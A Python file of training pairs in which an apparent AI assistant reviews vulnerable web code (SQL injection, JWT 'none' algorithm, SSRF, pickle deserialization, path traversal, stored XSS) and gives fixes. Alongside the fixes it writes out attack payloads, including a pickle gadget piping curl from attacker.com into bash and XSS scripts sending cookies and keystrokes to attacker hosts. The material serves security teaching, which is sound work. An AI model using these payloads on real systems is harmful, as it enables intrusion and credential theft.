"""Thinking-trace pairs: security review and vulnerability analysis."""

PAIRS = [
    (
        "thinking/security-sql-injection",
        "Review this Python endpoint for security issues:\n\n```python\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    page = request.args.get('page', '1')\n    sort = request.args.get('sort', 'date')\n    \n    sql = f\"SELECT * FROM articles WHERE title LIKE '%{query}%' ORDER BY {sort} LIMIT 20 OFFSET {(int(page)-1)*20}\"\n    results = db.execute(sql).fetchall()\n    \n    return render_template('search.html', results=results, query=query)\n```",
        r'''<think>
Let me analyze this endpoint systematically for security vulnerabilities.

**Input sources:** Three user-controlled parameters: `q`, `page`, `sort`. All come from query string, none are validated or sanitized.

**Vulnerability 1: SQL Injection in `query`**
The `query` parameter is directly interpolated into the SQL string with f-string. An attacker can send:
```
/search?q=' UNION SELECT username, password, email, NULL FROM users --
```
This breaks out of the LIKE clause and dumps the users table. Classic second-order SQLi.

**Vulnerability 2: SQL Injection in `sort`**
The `sort` parameter is interpolated directly into ORDER BY. No quotes around it, so it's even easier to exploit:
```
/search?sort=1; DROP TABLE articles; --
```
Or for blind extraction:
```
/search?sort=(CASE WHEN (SELECT substring(password,1,1) FROM users WHERE username='admin')='a' THEN title ELSE date END)
```
This is actually worse than the query injection because ORDER BY injection is often overlooked.

**Vulnerability 3: Integer conversion crash (DoS)**
`int(page)` will throw ValueError if page isn't numeric. No try/except. Sending `/search?page=abc` crashes the endpoint with a 500 error. Not a security vulnerability per se, but can be used for DoS and leaks stack traces in debug mode.

**Vulnerability 4: Reflected XSS**
The `query` parameter is passed to the template as `query=query`. If the template renders `{{ query }}` without escaping (or uses `{{ query | safe }}`), attacker can inject:
```
/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```
Jinja2 auto-escapes by default, so this depends on template configuration. But the code doesn't guarantee it.

**Vulnerability 5: No authentication or rate limiting**
The search endpoint has no rate limiting. An attacker can enumerate the entire database via the SQL injection, or just hammer the endpoint.

**Vulnerability 6: No OFFSET validation**
If page is negative or very large, the OFFSET could be negative (undefined behavior in some DBs) or force the DB to scan millions of rows.

Priority order for fixes:
1. SQL injection (critical -- full DB compromise)
2. XSS (high -- session hijacking)
3. Input validation (medium -- DoS, crashes)
4. Rate limiting (medium -- abuse prevention)
</think>

This endpoint has **4 critical/high vulnerabilities**. Here's the full breakdown and fix:

### Vulnerabilities Found

| # | Type | Severity | Parameter |
|---|------|----------|-----------|
| 1 | SQL Injection | **Critical** | `query` -- UNION-based extraction of any table |
| 2 | SQL Injection | **Critical** | `sort` -- ORDER BY injection, blind data extraction |
| 3 | Reflected XSS | High | `query` -- if template uses `| safe` |
| 4 | Unhandled exception / DoS | Medium | `page` -- non-numeric input crashes endpoint |

### Fixed Version

```python
from flask import request, render_template, abort
from markupsafe import escape

ALLOWED_SORT_COLUMNS = {'date', 'title', 'author', 'relevance'}
MAX_PAGE_SIZE = 20

@app.route('/search')
def search():
    query = request.args.get('q', '').strip()
    sort = request.args.get('sort', 'date')

    # Validate page is a positive integer
    try:
        page = max(1, int(request.args.get('page', '1')))
    except (ValueError, TypeError):
        page = 1

    # Whitelist sort column -- prevents ORDER BY injection
    if sort not in ALLOWED_SORT_COLUMNS:
        sort = 'date'

    # Parameterized query -- prevents SQL injection
    offset = (page - 1) * MAX_PAGE_SIZE
    results = db.execute(
        f"SELECT * FROM articles WHERE title LIKE ? ORDER BY {sort} LIMIT ? OFFSET ?",
        (f"%{query}%", MAX_PAGE_SIZE, offset)
    ).fetchall()

    # query is auto-escaped by Jinja2 -- ensure template never uses | safe
    return render_template('search.html', results=results, query=query)
```

### Why each fix matters

1. **Parameterized `?` for `query`**: The DB driver escapes the value. `UNION SELECT` becomes a literal string search, not SQL.

2. **Whitelist for `sort`**: You can't parameterize column names in ORDER BY -- `?` would add quotes, breaking the SQL. A whitelist is the only safe approach.

3. **`int()` in try/except with `max(1, ...)`**: Prevents both crashes and negative offsets.

4. **Jinja2 auto-escaping**: Flask/Jinja2 escapes by default. The fix is to *never* use `{{ query | safe }}` in the template. Add a comment or linting rule to enforce this.

### What parameterization CAN'T fix

Table names, column names, and ORDER BY directions can't use `?` placeholders. For these, always use whitelists:

```python
# This does NOT work:
db.execute("SELECT * FROM ? ORDER BY ?", (table, column))

# This is correct:
assert table in ALLOWED_TABLES
assert column in ALLOWED_COLUMNS
db.execute(f"SELECT * FROM {table} ORDER BY {column}")
```'''
    ),
    (
        "thinking/security-jwt-vulnerabilities",
        "Is this JWT authentication middleware secure?\n\n```python\nimport jwt\n\nSECRET = 'supersecret123'\n\ndef authenticate(request):\n    token = request.headers.get('Authorization', '').replace('Bearer ', '')\n    try:\n        payload = jwt.decode(token, SECRET, algorithms=['HS256', 'none'])\n        request.user_id = payload['user_id']\n        request.is_admin = payload.get('is_admin', False)\n        return True\n    except jwt.InvalidTokenError:\n        return False\n```",
        r'''<think>
Let me audit this JWT implementation step by step.

**Vulnerability 1: `none` algorithm allowed**
The `algorithms` list includes `'none'`. This is the classic JWT algorithm confusion attack. An attacker can:
1. Take any valid JWT
2. Change the header to `{"alg": "none"}`
3. Remove the signature entirely
4. Modify the payload to `{"user_id": 1, "is_admin": true}`
5. Send the token -- the server accepts it because `none` means "no signature verification"

This completely bypasses authentication. Any attacker who knows about JWT can forge admin tokens in seconds.

**Vulnerability 2: Weak symmetric secret**
`'supersecret123'` is trivially brute-forceable. Tools like hashcat can crack HS256 JWTs at billions of attempts per second. An attacker with a single valid JWT can recover the secret and forge any token.

HS256 secrets should be at least 256 bits of entropy (32 random bytes). A human-readable password is never enough.

**Vulnerability 3: Trust in client-supplied claims**
`request.is_admin = payload.get('is_admin', False)` -- the admin status comes directly from the JWT payload. If the JWT is signed by the server, this is... okay, but fragile. The real question is: who sets `is_admin` when the token is created?

If the token creation endpoint accepts `is_admin` from the client, that's a privilege escalation. Even if it doesn't, storing authorization claims in the JWT means they can't be revoked until the token expires. If an admin is demoted, their JWT still says `is_admin: true`.

Better: look up the user's roles from the database on each request, or use a short-lived token with a refresh mechanism.

**Vulnerability 4: No expiration check**
There's no `exp` claim validation. If a JWT is issued, it's valid forever. Stolen tokens can be replayed indefinitely. The `jwt.decode()` function in PyJWT does check `exp` by default IF the claim exists, but if the token was created without `exp`, there's no expiration.

**Vulnerability 5: No token type or issuer validation**
No `iss`, `aud`, or `typ` claims are verified. If the application issues different JWTs for different purposes (e.g., email verification tokens, password reset tokens), any of them could be used as authentication tokens.

**Vulnerability 6: Token extraction is fragile**
`request.headers.get('Authorization', '').replace('Bearer ', '')` -- if someone sends `Authorization: bearer token` (lowercase), `replace('Bearer ', '')` won't match. More critically, if they send `Authorization: Bearer Bearer malicious`, the first `Bearer ` gets stripped, leaving `Bearer malicious` as the token string. Use `split()` or a proper parser.

Severity ranking:
1. `none` algorithm -- Critical (complete auth bypass)
2. Weak secret -- Critical (full token forgery)
3. No expiration -- High (indefinite token validity)
4. Admin from claims -- Medium (privilege escalation if combined with other issues)
5. No issuer check -- Medium (token confusion)
6. Fragile parsing -- Low (edge case)
</think>

This has **2 critical** and **3 high-severity** vulnerabilities. The `none` algorithm alone makes authentication completely bypassable.

### Vulnerabilities

| # | Issue | Severity | Impact |
|---|-------|----------|--------|
| 1 | `none` algorithm allowed | **Critical** | Any attacker can forge any token with no signature |
| 2 | Weak secret `supersecret123` | **Critical** | Brute-force recovery in minutes with hashcat |
| 3 | No token expiration | High | Stolen tokens valid forever |
| 4 | Admin claim from JWT | High | Can't revoke admin; stale after role changes |
| 5 | No issuer/audience check | Medium | Token confusion between services |

### The `none` Algorithm Attack

```python
# Attacker crafts this token (no tools needed, just base64):
import base64, json

header = base64.urlsafe_b64encode(json.dumps(
    {"alg": "none", "typ": "JWT"}
).encode()).rstrip(b'=')

payload = base64.urlsafe_b64encode(json.dumps(
    {"user_id": 1, "is_admin": True}
).encode()).rstrip(b'=')

forged_token = f"{header.decode()}.{payload.decode()}."
# Server accepts this -- signature check is skipped
```

### Fixed Version

```python
import jwt
import os
from datetime import datetime, timezone

# 256-bit random secret -- generate once, store in env/secrets manager
SECRET = os.environ['JWT_SECRET']  # e.g., secrets.token_hex(32)

ALGORITHM = 'HS256'  # Single algorithm, never 'none'

def authenticate(request):
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return False

    token = auth_header[7:]  # len('Bearer ') == 7, no replace() ambiguity

    try:
        payload = jwt.decode(
            token,
            SECRET,
            algorithms=[ALGORITHM],  # Explicit single algorithm
            options={
                'require': ['exp', 'iat', 'sub'],  # Mandatory claims
            },
        )
    except jwt.InvalidTokenError:
        return False

    request.user_id = payload['sub']  # 'sub' is the standard claim for subject

    # Look up permissions from DB -- never trust JWT claims for authorization
    user = db.get_user(payload['sub'])
    if not user or not user.is_active:
        return False
    request.is_admin = user.is_admin  # From DB, not from token

    return True


def create_token(user_id: int) -> str:
    """Issue a token with proper claims and expiration."""
    now = datetime.now(timezone.utc)
    return jwt.encode(
        {
            'sub': user_id,
            'iat': now,
            'exp': now + timedelta(hours=1),  # Short-lived
            'iss': 'myapp',
        },
        SECRET,
        algorithm=ALGORITHM,
    )
```

### Key Principles

1. **Never allow `none` algorithm** -- explicitly list only the algorithm you use
2. **Secret must be high-entropy** -- `secrets.token_hex(32)` minimum, stored in env vars
3. **Always require `exp`** -- tokens must expire. 1 hour for access tokens, refresh tokens for longer sessions
4. **Authorization from DB, not JWT** -- JWT proves identity (`sub`), database provides current permissions
5. **Use standard claims** -- `sub` for user ID, `exp` for expiry, `iss` for issuer'''
    ),
    (
        "thinking/security-ssrf",
        "We have a feature where users provide a URL and our server fetches it to generate a preview (like link unfurling in Slack). How do I implement this safely?\n\n```python\n@app.route('/api/preview', methods=['POST'])\ndef generate_preview():\n    url = request.json.get('url')\n    response = requests.get(url, timeout=10)\n    # Parse HTML, extract title, description, image\n    soup = BeautifulSoup(response.text, 'html.parser')\n    return jsonify({\n        'title': soup.title.string if soup.title else '',\n        'description': soup.find('meta', {'name': 'description'}),\n        'image': soup.find('meta', {'property': 'og:image'}),\n    })\n```",
        r'''<think>
This is a classic Server-Side Request Forgery (SSRF) vulnerability. The server makes an HTTP request to a user-controlled URL. Let me trace through the attack scenarios.

**Attack 1: Internal network scanning**
Attacker sends `url = "http://192.168.1.1/admin"` -- the server fetches it from INSIDE the network. The attacker can scan the internal network, access admin panels, databases, etc.

**Attack 2: Cloud metadata endpoint**
On AWS: `url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
This returns IAM credentials. The attacker gets full AWS access. This is how the 2019 Capital One breach happened.

On GCP: `url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`
Same thing -- service account tokens.

**Attack 3: Internal services**
`url = "http://localhost:6379/"` -- sends commands to Redis
`url = "http://localhost:9200/_cat/indices"` -- enumerates Elasticsearch
`url = "http://internal-api:8080/admin/delete-all"` -- hits internal APIs

**Attack 4: File access via protocol smuggling**
`url = "file:///etc/passwd"` -- reads local files if the HTTP library supports file:// protocol
`url = "gopher://localhost:6379/_SET%20pwned%20true"` -- gopher protocol can talk to Redis, Memcached, etc.

**Attack 5: DNS rebinding**
Attacker controls `evil.com`. First DNS query returns `93.184.216.34` (passes validation). Second query (when request is made) returns `169.254.169.254`. Validation passed, but the request hits the metadata endpoint.

**Attack 6: Redirect-based bypass**
Attacker's URL returns a 302 redirect to `http://169.254.169.254/`. If the HTTP client follows redirects (requests does by default), all IP validation is bypassed.

**Defense strategy:**

1. **URL parsing and validation** -- whitelist schemes (http/https only), reject IPs in private ranges
2. **DNS resolution check** -- resolve the hostname FIRST, check the IP, THEN connect to that specific IP
3. **Disable redirects** -- or re-validate on each redirect
4. **Network-level isolation** -- run the fetcher in a sandbox with no access to internal network
5. **Response limits** -- don't download 10GB files
6. **Timeout and rate limiting**

The tricky part is DNS rebinding. Even if I validate the IP after DNS resolution, a second resolution could return a different IP. I need to pin the IP -- resolve once, validate, then connect to that exact IP.

In Python with requests, I can use a custom transport adapter that resolves DNS and validates before connecting.

Actually, the most robust approach is to use a dedicated egress proxy that only allows connections to public IPs. But let me show the application-level defense too.
</think>

This is a **Server-Side Request Forgery (SSRF)** vulnerability. The server fetches any URL the user provides, including internal network addresses, cloud metadata endpoints, and local files.

### What an attacker can do right now

```
POST /api/preview
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ Returns your AWS IAM credentials

{"url": "http://localhost:6379/"}
→ Probes your Redis instance

{"url": "file:///etc/passwd"}
→ Reads local files
```

### Fixed Version

```python
import ipaddress
import socket
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup

# Blocked IP ranges (private, loopback, link-local, metadata)
BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('100.64.0.0/10'),   # Carrier-grade NAT
    ipaddress.ip_network('::1/128'),          # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

MAX_RESPONSE_BYTES = 1_000_000  # 1MB max
ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_CONTENT_TYPES = {'text/html', 'application/xhtml+xml'}


def is_public_ip(ip_str: str) -> bool:
    """Check if an IP address is publicly routable (not internal)."""
    try:
        addr = ipaddress.ip_address(ip_str)
    except ValueError:
        return False
    return not any(addr in network for network in BLOCKED_RANGES)


def validate_url(url: str) -> str:
    """Validate and normalize URL. Raises ValueError if unsafe."""
    parsed = urlparse(url)

    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme '{parsed.scheme}' not allowed")

    if not parsed.hostname:
        raise ValueError("No hostname in URL")

    # Block IPs directly in URL
    try:
        addr = ipaddress.ip_address(parsed.hostname)
        if not is_public_ip(str(addr)):
            raise ValueError(f"IP {addr} is not publicly routable")
    except ValueError as e:
        if "not publicly routable" in str(e):
            raise
        # Not an IP literal -- it's a hostname, resolve it below

    # Resolve DNS and validate ALL returned IPs
    try:
        addrinfos = socket.getaddrinfo(parsed.hostname, parsed.port or 443, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        raise ValueError(f"Cannot resolve hostname: {parsed.hostname}")

    for family, _, _, _, sockaddr in addrinfos:
        ip = sockaddr[0]
        if not is_public_ip(ip):
            raise ValueError(f"Hostname resolves to non-public IP: {ip}")

    return url


def safe_fetch(url: str) -> requests.Response:
    """Fetch a URL with SSRF protections."""
    validated_url = validate_url(url)

    resp = requests.get(
        validated_url,
        timeout=5,
        allow_redirects=False,  # Don't follow redirects (could go to internal IPs)
        headers={'User-Agent': 'MyApp-LinkPreview/1.0'},
        stream=True,  # Don't download everything at once
    )

    # Check content type before reading body
    content_type = resp.headers.get('Content-Type', '').split(';')[0].strip().lower()
    if content_type not in ALLOWED_CONTENT_TYPES:
        resp.close()
        raise ValueError(f"Content type '{content_type}' not allowed")

    # Read with size limit
    content = resp.raw.read(MAX_RESPONSE_BYTES + 1)
    if len(content) > MAX_RESPONSE_BYTES:
        raise ValueError("Response too large")

    resp._content = content
    return resp


@app.route('/api/preview', methods=['POST'])
@rate_limit(max_requests=10, per_seconds=60)  # Rate limit per user
def generate_preview():
    url = request.json.get('url', '')

    try:
        resp = safe_fetch(url)
    except ValueError as e:
        return jsonify({'error': str(e)}), 400
    except requests.RequestException:
        return jsonify({'error': 'Failed to fetch URL'}), 502

    soup = BeautifulSoup(resp.content, 'html.parser')

    # Extract with safe defaults
    title = ''
    if soup.title and soup.title.string:
        title = soup.title.string[:200]  # Truncate

    desc_tag = soup.find('meta', attrs={'name': 'description'})
    description = desc_tag['content'][:500] if desc_tag and desc_tag.get('content') else ''

    img_tag = soup.find('meta', attrs={'property': 'og:image'})
    image = ''
    if img_tag and img_tag.get('content'):
        # Validate image URL too -- don't let og:image point to internal resources
        try:
            validate_url(img_tag['content'])
            image = img_tag['content']
        except ValueError:
            pass

    return jsonify({'title': title, 'description': description, 'image': image})
```

### Defense layers explained

1. **Scheme whitelist** -- only `http`/`https`. Blocks `file://`, `gopher://`, `ftp://`
2. **DNS resolution + IP validation** -- resolves hostname, checks ALL IPs against blocked ranges. Catches `http://evil.com` that resolves to `127.0.0.1`
3. **No redirects** -- `allow_redirects=False` prevents redirect to `http://169.254.169.254`
4. **Response size limit** -- streaming with 1MB cap prevents DoS via large downloads
5. **Content-Type check** -- only process HTML, don't fetch binaries
6. **Rate limiting** -- prevents abuse of the fetcher as a port scanner
7. **og:image re-validation** -- the fetched HTML could reference internal URLs in meta tags'''
    ),
    (
        "thinking/security-deserialization",
        "We're using Python pickle to cache computed results. Is this a security concern?\n\n```python\nimport pickle\nimport redis\n\ndef cache_result(key, value, ttl=3600):\n    r = redis.Redis()\n    r.setex(key, ttl, pickle.dumps(value))\n\ndef get_cached(key):\n    r = redis.Redis()\n    data = r.get(key)\n    if data:\n        return pickle.loads(data)\n    return None\n```",
        r'''<think>
Pickle deserialization is one of the most dangerous operations in Python. Let me think through the threat model here.

**What pickle.loads actually does:**
When you unpickle data, Python executes the `__reduce__` method on the deserialized object. This means an attacker who can control the pickled bytes can execute ARBITRARY CODE on the server.

The exploit is trivial:
```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))
pickle.dumps(Exploit())
```

When `pickle.loads` processes this, it calls `os.system('curl attacker.com/shell.sh | bash')`. Full remote code execution.

**Is this actually exploitable in the user's code?**
The question is: can an attacker control the data in Redis?

Scenario 1: Redis is exposed to the network (no auth, default port 6379). VERY common. Attacker writes a malicious pickle to a known cache key. Next time the app calls `get_cached(key)`, it executes the attacker's code. Severity: Critical.

Scenario 2: Redis requires auth and is on a private network. Attacker would need another vulnerability first (SSRF, for instance) to write to Redis. Less likely but still dangerous -- defense in depth says don't trust the data even then.

Scenario 3: The cache key comes from user input. If `key` is derived from a user-controlled value (e.g., `cache_result(f"user:{user_id}", ...)`) and the attacker can manipulate other users' cache entries through any means, they can inject malicious pickles.

Scenario 4: Redis data is backed up/restored from files. If the backup is tampered with, all cached data becomes attack vectors on restore.

**The fix: never use pickle for data that crosses trust boundaries.**

Alternatives:
1. `json.dumps/json.loads` -- safe, but only handles basic types
2. `msgpack` -- fast binary serialization, no code execution
3. For complex Python objects, serialize to JSON-compatible dict first
4. If you MUST use pickle, sign it with HMAC so tampering is detected

Actually, `hmac` + `pickle` is what Django does with its `signing` module. But it's better to just avoid pickle entirely for cached data, because the data being cached is usually serializable as JSON anyway.

Let me also consider: what types of values are being cached? The code says "computed results." If these are DataFrames, NumPy arrays, or complex objects, JSON won't work directly. For those cases, use format-specific serializers (parquet for DataFrames, .npy for arrays).
</think>

**Yes, this is a critical security vulnerability.** `pickle.loads` executes arbitrary code. If an attacker can write to your Redis (misconfigured network, SSRF, shared hosting), they get full remote code execution on your server.

### The exploit (this trivial)

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# Attacker writes this to your Redis key:
malicious_bytes = pickle.dumps(RCE())

# When your app calls get_cached(), it executes the shell command
```

### How an attacker reaches Redis

- Redis bound to `0.0.0.0` with no password (extremely common default)
- SSRF in another endpoint fetches `http://localhost:6379`
- Shared infrastructure where another service has Redis access
- Compromised backup that's restored into Redis

### Fixed Version: Use JSON

```python
import json
import redis

def cache_result(key: str, value, ttl: int = 3600):
    r = redis.Redis()
    r.setex(key, ttl, json.dumps(value))

def get_cached(key: str):
    r = redis.Redis()
    data = r.get(key)
    if data:
        return json.loads(data)
    return None
```

### For complex objects that JSON can't handle

```python
import json
import msgpack  # pip install msgpack -- binary format, no code execution
import redis

# Option 1: msgpack (fast, binary, handles bytes/datetime with ext types)
def cache_result(key: str, value, ttl: int = 3600):
    r = redis.Redis()
    r.setex(key, ttl, msgpack.packb(value, use_bin_type=True))

def get_cached(key: str):
    r = redis.Redis()
    data = r.get(key)
    if data:
        return msgpack.unpackb(data, raw=False)
    return None

# Option 2: For custom classes, define a serialization contract
class ComputeResult:
    def __init__(self, score, labels, metadata):
        self.score = score
        self.labels = labels
        self.metadata = metadata

    def to_dict(self):
        return {'score': self.score, 'labels': self.labels, 'metadata': self.metadata}

    @classmethod
    def from_dict(cls, d):
        return cls(d['score'], d['labels'], d['metadata'])

# Cache: json.dumps(result.to_dict())
# Retrieve: ComputeResult.from_dict(json.loads(data))
```

### If you absolutely must use pickle (not recommended)

Sign it with HMAC so tampering is detected:

```python
import hashlib
import hmac
import pickle
import os

SIGNING_KEY = os.environ['CACHE_SIGNING_KEY'].encode()

def cache_result(key: str, value, ttl: int = 3600):
    data = pickle.dumps(value, protocol=pickle.HIGHEST_PROTOCOL)
    signature = hmac.new(SIGNING_KEY, data, hashlib.sha256).hexdigest()
    r = redis.Redis()
    r.setex(key, ttl, signature.encode() + b':' + data)

def get_cached(key: str):
    r = redis.Redis()
    raw = r.get(key)
    if not raw:
        return None
    sig_hex, _, data = raw.partition(b':')
    expected = hmac.new(SIGNING_KEY, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig_hex.decode(), expected):
        raise ValueError("Cache tampering detected")
    return pickle.loads(data)
```

**But prefer JSON or msgpack.** If you don't need to serialize arbitrary Python objects (and you almost never do for caching), don't use a format that can execute code.'''
    ),
    (
        "thinking/security-path-traversal",
        "Users can upload files and later download them. Is this download endpoint safe?\n\n```python\n@app.route('/download/<filename>')\ndef download_file(filename):\n    upload_dir = '/var/app/uploads'\n    filepath = os.path.join(upload_dir, filename)\n    return send_file(filepath)\n```",
        r'''<think>
This is a path traversal vulnerability. Let me trace through the attack:

The `filename` parameter comes from the URL. What if an attacker requests:
```
/download/../../etc/passwd
```

`os.path.join('/var/app/uploads', '../../etc/passwd')` returns `/var/app/uploads/../../etc/passwd` which resolves to `/var/etc/passwd` -- wait, let me recalculate.

Actually: `/var/app/uploads` + `../../etc/passwd`:
- `/var/app/uploads/../../etc/passwd`
- Up from uploads → `/var/app/`
- Up from app → `/var/`
- Then `etc/passwd` → `/var/etc/passwd`

Hmm, that's not `/etc/passwd`. Need more `../`:
```
/download/../../../etc/passwd
```
- `/var/app/uploads/../../../etc/passwd`
- Up to `/var/app/`, up to `/var/`, up to `/`, then `etc/passwd`
- Final: `/etc/passwd`

Yes, that works. The attacker reads any file the server process can access.

But wait -- there's a subtlety with `os.path.join` in Python. If the second argument starts with `/`, it REPLACES the first argument entirely:
```python
os.path.join('/var/app/uploads', '/etc/passwd')  # Returns '/etc/passwd'
```

So `/download/%2fetc%2fpasswd` (URL-encoded `/etc/passwd`) would give `os.path.join('/var/app/uploads', '/etc/passwd')` = `/etc/passwd`. Even simpler than `../`.

Actually, Flask/Werkzeug might decode `%2f` to `/` in the URL routing, or it might not depending on the WSGI server. The `../` approach is more reliable.

There's also null byte injection on older Python versions (< 3.x): `filename.txt%00.png` would truncate at the null byte. Not relevant for modern Python 3.

**Fixes:**

1. `os.path.realpath` or `os.path.abspath` + check that result starts with the upload directory
2. Flask's `send_from_directory` which does this check internally
3. `werkzeug.utils.secure_filename` which strips `../` and other dangerous characters

`send_from_directory` is the right answer for Flask. It handles the path traversal check internally. But I should still validate the filename for defense in depth.

Let me also check: what about symlinks? If an attacker uploaded a file that's actually a symlink to `/etc/passwd`, `send_from_directory` would follow it. The upload endpoint needs to reject symlinks too. But for the download endpoint, if we trust that the upload validation is correct, this is less of a concern.
</think>

**Path traversal vulnerability.** An attacker can read any file on the server:

```
GET /download/../../../etc/passwd
→ os.path.join('/var/app/uploads', '../../../etc/passwd')
→ resolves to /etc/passwd
```

Even simpler on some setups (Python's `os.path.join` replaces base when second arg is absolute):
```
GET /download/%2fetc%2fpasswd
→ os.path.join('/var/app/uploads', '/etc/passwd')
→ returns '/etc/passwd'
```

### Fixed Version

```python
from flask import abort
from werkzeug.utils import secure_filename

UPLOAD_DIR = '/var/app/uploads'

@app.route('/download/<filename>')
def download_file(filename):
    # secure_filename strips ../, /, and other path components
    safe_name = secure_filename(filename)
    if not safe_name:
        abort(400)

    # send_from_directory has its own path traversal protection
    return send_from_directory(UPLOAD_DIR, safe_name)
```

### Why this works (defense in depth)

1. **`secure_filename()`** strips all path separators and `..` sequences:
   ```python
   secure_filename('../../etc/passwd')  # Returns 'etc_passwd'
   secure_filename('/etc/passwd')       # Returns 'etc_passwd'
   secure_filename('../.ssh/id_rsa')    # Returns 'ssh_id_rsa'
   ```

2. **`send_from_directory()`** resolves the final path and verifies it's inside the specified directory. Even if `secure_filename` had a bypass, this catches it.

### If not using Flask

```python
import os

def safe_download(upload_dir: str, filename: str) -> str:
    """Resolve filename and verify it's within upload_dir."""
    # Resolve to absolute paths (follows symlinks, resolves ../)
    base = os.path.realpath(upload_dir)
    target = os.path.realpath(os.path.join(base, filename))

    # Verify the resolved path is within the upload directory
    if not target.startswith(base + os.sep) and target != base:
        raise PermissionError(f"Path traversal blocked: {filename}")

    if not os.path.isfile(target):
        raise FileNotFoundError(f"File not found: {filename}")

    return target
```

### Don't forget the upload side

The upload endpoint must also validate:
```python
@app.route('/upload', methods=['POST'])
def upload_file():
    f = request.files.get('file')
    if not f or not f.filename:
        abort(400)

    safe_name = secure_filename(f.filename)
    if not safe_name:
        abort(400)

    # Whitelist allowed extensions
    allowed = {'.png', '.jpg', '.pdf', '.txt'}
    ext = os.path.splitext(safe_name)[1].lower()
    if ext not in allowed:
        abort(400, f"Extension {ext} not allowed")

    dest = os.path.join(UPLOAD_DIR, safe_name)
    f.save(dest)

    # Verify it's a regular file, not a symlink (defense against TOCTOU)
    if os.path.islink(dest):
        os.remove(dest)
        abort(400, "Symlinks not allowed")

    return jsonify({'filename': safe_name})
```'''
    ),
    (
        "thinking/security-xss-stored",
        "We have a forum where users post messages displayed to other users. The messages support basic formatting. Is this safe?\n\n```python\n@app.route('/post', methods=['POST'])\ndef create_post():\n    content = request.form['content']\n    db.execute('INSERT INTO posts (user_id, content) VALUES (?, ?)', \n               (current_user.id, content))\n    return redirect('/forum')\n\n@app.route('/forum')\ndef forum():\n    posts = db.execute('SELECT * FROM posts ORDER BY created_at DESC').fetchall()\n    return render_template('forum.html', posts=posts)\n```\n\n```html\n<!-- forum.html -->\n{% for post in posts %}\n<div class=\"post\">\n  <p>{{ post.content | safe }}</p>\n</div>\n{% endfor %}\n```",
        r'''<think>
There it is: `{{ post.content | safe }}`. The `| safe` filter in Jinja2 tells the template engine to NOT escape the content. This means any HTML/JavaScript in the post content renders as-is.

This is a **Stored XSS** vulnerability -- the most dangerous type of XSS because:
1. The payload is stored in the database permanently
2. It executes for EVERY user who views the page
3. No interaction needed beyond visiting the forum page
4. The attacker doesn't need the victim to click a link

Attack scenarios:

**Session hijacking:**
```html
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: document.cookie
});
</script>
```
Every user who visits the forum sends their session cookie to the attacker. The attacker can now impersonate any user including admins.

**Keylogging:**
```html
<script>
document.addEventListener('keypress', e => {
  fetch('https://attacker.com/keys?k=' + e.key);
});
</script>
```

**Crypto mining:**
```html
<script src="https://attacker.com/miner.js"></script>
```

**Phishing:**
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Session expired. Please log in again.</h2>
  <form action="https://attacker.com/phish">
    <input name="email" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Log In</button>
  </form>
</div>
```

The fix depends on what "basic formatting" means. If they want bold/italic/links, they need to:
1. Use a markup language (Markdown) that gets converted to safe HTML
2. Use an HTML sanitizer that allows only specific safe tags
3. Never render raw user content as HTML

Let me think about which approach is best:

- **Remove `| safe` entirely**: Jinja2 auto-escapes, so `{{ post.content }}` would show raw HTML tags as text. Safe but no formatting at all.
- **Markdown**: Users write `**bold**` and it becomes `<strong>bold</strong>`. Then sanitize the output to remove any remaining HTML.
- **HTML sanitizer (bleach/nh3)**: Allow specific tags like `<b>`, `<i>`, `<a>`, `<p>`, strip everything else.

I'd recommend Markdown input + HTML sanitization of the output. Two layers of defense.

The `bleach` library is deprecated in favor of `nh3` (which is a Python wrapper around the Rust `ammonia` library). Much faster and more secure.
</think>

**Stored XSS -- the most dangerous XSS variant.** The `| safe` filter disables Jinja2's auto-escaping, so any JavaScript in a post executes for every visitor.

### What an attacker posts

```html
Hey everyone! <script>
  // Steal every visitor's session cookie
  new Image().src = 'https://evil.com/steal?c=' + document.cookie;
</script>
```

This runs silently for **every user who views the forum page**. No clicks needed.

### Fix: Sanitize HTML, never trust `| safe`

```bash
pip install nh3  # Rust-based HTML sanitizer (successor to bleach)
```

```python
import nh3

# Define allowed tags and attributes
ALLOWED_TAGS = {'p', 'br', 'b', 'strong', 'i', 'em', 'a', 'ul', 'ol', 'li', 'code', 'pre'}
ALLOWED_ATTRIBUTES = {'a': {'href', 'title'}}

def sanitize_html(content: str) -> str:
    """Strip all tags except safe formatting ones."""
    return nh3.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        link_rel='noopener noreferrer nofollow',  # Security for links
        url_schemes={'http', 'https'},  # Block javascript: URLs in <a href>
    )

@app.route('/post', methods=['POST'])
def create_post():
    raw_content = request.form['content']
    safe_content = sanitize_html(raw_content)  # Sanitize BEFORE storing
    db.execute('INSERT INTO posts (user_id, content) VALUES (?, ?)',
               (current_user.id, safe_content))
    return redirect('/forum')
```

```html
<!-- forum.html -->
{% for post in posts %}
<div class="post">
  {# safe is OK now because content was sanitized before storage #}
  <p>{{ post.content | safe }}</p>
</div>
